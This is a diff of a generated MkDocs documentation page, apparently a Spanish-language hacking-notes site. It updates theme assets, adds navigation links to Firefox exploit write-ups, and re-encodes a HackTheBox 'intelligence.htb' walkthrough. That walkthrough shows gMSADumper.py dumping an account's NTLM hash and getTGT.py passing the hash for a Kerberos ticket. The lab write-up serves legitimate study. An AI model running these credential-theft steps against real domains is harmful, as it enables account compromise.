@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -27,7 +27,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -307,6 +307,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -423,6 +427,62 @@
     
   
     CVE-2026-42980 WMI Underflow (ES)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-en/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox to SYSTEM (EN)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/binary-gecko-academy/cve-2019-11707-firefox-ionmonkey-to-system-es/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2019-11707 Firefox a SYSTEM (ES)
   
 
     
@@ -1633,7 +1693,7 @@
 <ol>
 <li>
 <p>Ejecutar <code>gMSADumper.py</code> para extraer el hash NTLM de la cuenta <code>svc_int$</code>:
-     <div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>python3<span class="w"> </span>gMSADumper.py<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;TED.GRAVES&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Mr.Teddy&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;intelligence.htb&#39;</span>
+     <div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>python3<span class="w"> </span>gMSADumper.py<span class="w"> </span>-u<span class="w"> </span><span class="s1">'TED.GRAVES'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'Mr.Teddy'</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">'intelligence.htb'</span>
 </span></code></pre></div>
      Resultado:
      <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>svc_int$:::b05dfb2636385604c6d36b0ca61e35cb
@@ -1641,7 +1701,7 @@
 </li>
 <li>
 <p>Utilizar <code>getTGT.py</code> para obtener un TGT usando el hash NTLM de <code>svc_int$</code>:
-     <div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>getTGT.py<span class="w"> </span><span class="s1">&#39;INTELLIGENCE.HTB/svc_int$&#39;</span><span class="w"> </span>-hashes<span class="w"> </span>:b05dfb2636385604c6d36b0ca61e35cb
+     <div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>getTGT.py<span class="w"> </span><span class="s1">'INTELLIGENCE.HTB/svc_int$'</span><span class="w"> </span>-hashes<span class="w"> </span>:b05dfb2636385604c6d36b0ca61e35cb
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/kali/svc_int$.ccache
 </span></code></pre></div></p>
 </li>
@@ -1795,7 +1855,7 @@
       <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.sections", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.integrate", "content.code.copy", "content.action.edit", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
     
   </body>
